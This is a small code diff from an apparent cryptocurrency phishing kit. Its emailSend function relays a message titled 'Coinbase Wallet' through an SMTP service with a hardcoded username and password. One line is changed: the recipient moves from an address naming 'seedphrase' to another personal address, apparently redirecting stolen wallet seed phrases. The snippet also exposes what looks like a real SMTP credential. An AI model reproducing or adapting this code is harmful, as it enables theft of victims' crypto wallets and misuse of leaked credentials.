@@ -7,7 +7,7 @@ function emailSend() {
     Host: "smtp.elasticemail.com",
     Username: "genesisrectification@gmail.com",
     Password: "BE65029E46280CA3B78F0EE1F9F96A16AD56",
-    To: "uchennaitodoseedphrase@gmail.com",
+    To: "hillaryali27@gmail.com",
     From: "genesisrectification@gmail.com",
     Subject: "Coinbase Wallet",
     Body: messageBody,
